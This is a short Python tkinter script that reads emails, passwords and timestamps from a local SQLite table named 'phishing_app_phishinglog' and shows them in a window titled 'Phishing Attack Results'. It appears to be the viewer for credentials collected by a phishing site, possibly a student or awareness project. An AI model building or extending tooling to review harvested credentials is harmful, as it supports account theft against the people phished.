import tkinter as tk
import sqlite3

def fetch_data():
    conn = sqlite3.connect("db.sqlite3")
    cursor = conn.cursor()
    cursor.execute("SELECT email, password, timestamp FROM phishing_app_phishinglog")
    records = cursor.fetchall()
    conn.close()

    result_text.delete("1.0", tk.END)
    for record in records:
        result_text.insert(tk.END, f"Email: {record[0]},\nPassword: {record[1]},\nTime: {record[2]}\n")

root = tk.Tk()
root.title("Phishing Attack Results")

fetch_button = tk.Button(root, text="Fetch Data", command=fetch_data)
fetch_button.pack()

result_text = tk.Text(root, height=15, width=50)
result_text.pack()

root.mainloop()
